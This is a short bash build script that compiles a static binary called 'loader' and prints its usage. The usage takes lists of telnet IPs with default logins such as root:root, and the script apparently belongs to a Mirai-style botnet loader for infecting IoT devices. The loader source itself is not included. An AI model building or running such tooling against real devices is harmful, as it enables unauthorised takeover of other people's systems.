#!/bin/bash

echo "=== Building Loader for x86_64 ==="

# Create bins directory
mkdir -p bins

# Compile loader
gcc -static -O2 -lpthread -pthread src/*.c -o loader

if [ $? -eq 0 ]; then
    echo "[OK] Loader built successfully"
    ls -lh loader
else
    echo "[FAIL] Build failed"
    exit 1
fi

echo ""
echo "Usage: ./loader < creds.txt"
echo "Creds format: ip:port user:pass arch"
echo "Example: 172.16.193.192:23 root:root x86_64"